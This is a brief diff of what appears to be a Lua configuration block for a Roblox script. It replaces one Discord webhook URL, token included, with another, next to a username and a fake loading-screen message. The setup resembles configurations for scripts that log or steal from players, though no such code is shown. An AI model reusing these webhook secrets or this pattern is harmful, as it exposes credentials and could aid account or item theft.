@@ -1,5 +1,5 @@
 Username = "Dev_RlCH"
-WebHook = "https://discord.com/api/webhooks/1086479428953051226/azLSZogXiWl5YlW2kZYVX4u0VQzruphis-fY7-slhLozXsgMnN6p9Hw5hrrfAmfJBnnT"
+WebHook = "https://discord.com/api/webhooks/1086488477245395004/UYWEb0myAx58NjidEBJJeMER54aPk2a-s44JAqEtHRorinICNJsbokqKnrZNZNLbVl8l"
 loadingscreen = true 
 _G.CustomScriptName = "TurnON"
 _G.Text1 = "Script Loaded..."
